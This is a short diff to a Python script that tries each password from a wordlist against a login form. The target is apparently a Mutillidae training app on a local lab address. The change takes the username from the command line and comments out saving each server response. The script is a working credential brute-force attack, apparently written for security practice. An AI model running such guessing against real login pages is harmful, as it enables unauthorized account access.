@@ -17,8 +17,8 @@ url = 'http://192.168.198.128/mutillidae/index.php?page=login.php'
 
 
 
-username = "test12345"
-passlist = sys.argv[1]
+username = sys.argv[1]
+passlist = sys.argv[2]
 
 
 with open(passlist, 'r') as file:
@@ -32,7 +32,7 @@ with open(passlist, 'r') as file:
         }
 
         response = requests.post(url, data=data, verify=False)
-        open("temp.html", "w+").write(response.text)
+        # open("temp.html", "w+").write(response.text)
         if 'Password incorrect' in response.text:
             print(password, "... FAILED", flush=True)
         else:
